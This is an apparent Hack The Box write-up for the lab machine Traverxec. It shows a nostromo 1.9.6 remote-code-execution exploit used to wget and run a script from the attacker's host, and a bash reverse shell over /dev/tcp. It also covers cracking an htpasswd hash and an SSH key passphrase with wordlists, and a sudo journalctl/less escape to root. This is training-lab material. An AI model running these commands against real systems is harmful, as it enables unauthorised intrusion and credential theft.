---
path: "/htb-traverxec"
title: "Hack The Box - Traverxec"
date: "04/17/2020"
featuredImage: ../../images/traverxec.png
---

You start off by doing a nmap scan to see what ports are opened. This will give you an idea of what you could potentially exploit.

## NMAP Scan

```
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not
...
```
At this time there is not much that can be done we with the port 22. More recon needs to be done. Looking up nostromo, you can find that version 1.9.6 is [vulnerble](https://www.exploit-db.com/exploits/47837) to Remote Code Execution (RCE). The readily avaialble exploit comes in the form of a python script (There is a Metasploit module also avialable). To run the script, a hostname, port and command must be supplied. You could leverage this to get a shell into the box but I decide to just issue a command to grab a [linux enumeration script](https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh) and run it. (This script was hosted locally).

```
python nostromo_exploit.py 10.10.10.165 80 "cd /var/nostromo/logs/ && wget http://10.10.14.31:8000/lse.sh.1 && chmod u+x lse.sh.1 && ./lse.sh.1"
```

The output is quite long but the one thing that stands out.
```

                                        _____-2019-16278
        _____  _______    ______   _____\    \   
   _____\    \_\      |  |      | /    / |    |  
  /     /|     ||     /  /     /|/    /  /___/|  
 /     / /____/||\    \  \    |/|    |__ |___|/  
|     | |____|/ \ \    \ |    | |       \        
|     |  _____   \|     \|    | |     __/ __     
|\     \|\    \   |\         /| |\    \  /  \    
| \_____\|    |   | \_______/ | | \____\/    |   
| |     /____/|    \ |     | /  | |    |____/|   
 \|_____|    ||     \|_____|/    \|____|   | |   
        |____|/                        |___|/    




HTTP/1.1 200 OK
Date: Thu, 05 Mar 2020 07:21:53 GMT
Server: nostromo 1.9.6
Connection: close
...
===============================================================( software )=====
...
[!] sof040 Found any .htpasswd files?...................................... yes!
---
/var/nostromo/conf/.htpasswd
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
---
...
==================================( FINISHED )==================================
```

We now have a username and potential password. From the looks of the hash this is md5crypt. You verify this running 
`hashcat --example-hashes` and searching for the pattern `$1$`

```
hashcat -m 500 -a 0 ./pass.txt /usr/share/wordlists/rockyou.txt --force --show
$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/:Nowonly4me
```

To do more recon establish a shell on box 
`python nostromo_exploit.py 10.10.10.165 80 "nohup bash -c 'bash -i >& /dev/tcp/10.10.14.93/1337 0>&1'"`

From within the box you can locate the nostromo configuration file. This file specifies the options for [HOMEDIRS](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd#HOMEDIRS). This specifies the home directory for nostromo. 

`/var/nostromo/conf/`

The `homedirs_public` option is a publicly accessible folder. You cannot access the `~david/` but you can access `~david/public_www`.
The content of the directory is as follows
```
drwxr-xr-x 2 david david 4096 Oct 25 17:02 protected-file-area

./protected-file-area:
total 16
drwxr-xr-x 2 david david 4096 Oct 25 17:02 .
drwxr-xr-x 3 david david 4096 Oct 25 15:45 ..
-rw-r--r-- 1 david david   45 Oct 25 15:46 .htaccess
-rw-r--r-- 1 david david 1915 Oct 25 17:02 backup-ssh-identity-files.tgz
www-data@traverxec:/home/david/public_www$
```

The backup file contains the following
```
./home:
total 12
drwxr-xr-x 3 root root 4096 Mar  5 19:10 .
drwxr-xr-x 3 root root 4096 Mar  5 20:26 ..
drwxr-xr-x 3 root root 4096 Mar  5 19:10 david

./home/david:
total 12
drwxr-xr-x 3 root root 4096 Mar  5 19:10 .
drwxr-xr-x 3 root root 4096 Mar  5 19:10 ..
drwx------ 2 1000 1000 4096 Oct 25 17:02 .ssh

./home/david/.ssh:
total 20
drwx------ 2 1000 1000 4096 Oct 25 17:02 .
drwxr-xr-x 3 root root 4096 Mar  5 19:10 ..
-rw-r--r-- 1 1000 1000  397 Oct 25 17:02 authorized_keys
-rw------- 1 1000 1000 1766 Oct 25 17:02 id_rsa
-rw-r--r-- 1 1000 1000  397 Oct 25 17:02 id_rsa.pub
```

The public key is password protectec but can be cracked with `JohnTheRipper`

```
oot@kali:~/HTB/Traverxec# john --wordlist=/usr/share/wordlists/rockyou.txt david.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (home/david/.ssh/id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:03 DONE (2020-03-05 19:23) 0.3154g/s 4524Kp/s 4524Kc/s 4524KC/sa6_123..*7¡Vamos!
Session completed
```

With this you can ssh as david and get the user flag.
```
root@kali:~/HTB/Traverxec/home/david# ssh david@10.10.10.165 -i .ssh/id_rsa 
Enter passphrase for key '.ssh/id_rsa': 
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
Last login: Sat Apr 18 00:43:51 2020 from 10.10.14.93
david@traverxec:~$ ls
bin  public_www  user.txt
david@traverxec:~$ 
```

For the root flag, start from the bin directory in the david home directory. The file `server-stats.sh` contains a line that executes a sudo command.

```
david@traverxec:~/bin$ cat server-stats.sh 
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

You can use [journalctl](https://gtfobins.github.io/gtfobins/journalctl/#sudo) to escalate privilege to root.

The following command is to be execute with the window smaller than usual to have the output piped to less. From less you can then execute a shell.
`/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`

from within less 
`!/bin/sh`

Output
```
david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Sat 2020-04-18 01:33:
Apr 18 01:33:59 traverxec nhttpd[442]:
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
nostromo_1.9.6-1.deb  root.txt
```




